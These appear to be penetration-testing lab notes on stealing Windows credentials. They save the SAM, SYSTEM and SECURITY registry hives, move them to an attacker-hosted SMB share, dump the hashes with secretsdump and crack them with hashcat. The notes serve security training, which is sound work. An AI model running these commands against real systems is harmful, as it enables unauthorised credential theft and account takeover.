## Registry hives

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:

|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|

#### Using reg.exe to copy registry hives

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

#### Creating a share with smbserver

```shell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.

##### Moving Hive copies to share

```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

## Dumping hashes with secretsdump

```shell-session
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

the first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives  is crucial.


## Cracking hashes with Hashcat

```shell-session
sudo vim hashestocrack.txt

```


#### Running Hashcat against NT hashes
```shell-session
shakir0x00@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
